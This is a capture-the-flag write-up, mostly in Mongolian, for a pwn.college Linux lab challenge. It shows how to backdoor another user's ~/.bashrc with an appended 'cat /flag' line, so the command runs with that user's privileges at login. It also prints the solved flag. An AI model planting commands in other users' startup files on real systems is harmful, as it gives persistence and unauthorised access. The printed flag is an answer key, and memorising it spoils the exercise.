# Bashrc Backdoor

> Module: **Linux Luminarium / Silly Shenanigans** · Challenge: `bashrc-backdoor`

Хохирогч `zardus`-ын `~/.bashrc`-д `cat /flag` мөр нэмж, түүнийг нэвтрэх үед payload маань root бус, зардусын эрхээр ажиллаж флагийг уншина.

## Тайлбар

- Shell эхлэхдээ home директор дахь `.bashrc`-ийг startup script болгон гүйцэтгэдэг. Энэ нь тохиргоо хийхэд төдийгүй **persistence** (тасралтгүй хяналт) авахад бузар зорилгоор ч ашиглагдана — хортой програм ихэвчлэн `.bashrc` мэтийн startup script руу суудаг.
- Энэ challenge-д би `hacker` хэрэглэгчээр `/home/zardus/.bashrc`-д бичих эрхтэй, харин `zardus` нь `/flag`-ийг унших эрхтэй. `/challenge/victim` нь зардус нэвтрэхийг симуляц хийдэг.
- `.bashrc` нь энгийн shell script учир төгсгөлд нь `cat /flag` мөр нэмэхэд л зардус нэвтрэх бүрд тэр команд түүний эрхээр ажиллана.
- `>>`-ээр төгсгөлд нь нэмнэ (`>` нь бүхэл файлыг дарж бичих тул хэрэглэхгүй) — олон мөртэй нарийн startup тохиргоог гэмтээхгүй.

## Solution

```console
hacker@shenanigans~bashrc-backdoor:~$ echo 'cat /flag ' >> /home/zardus/.bashrc
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
Username: zardus
pwn.college{AD_8b1rgKrle09hol5vQkJOKxqM.0VMzEzNxwyMwEzM2EzW}
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
hacker@shenanigans~bashrc-backdoor:~$
```

## Flag

```
pwn.college{AD_8b1rgKrle09hol5vQkJOKxqM.0VMzEzNxwyMwEzM2EzW}
```
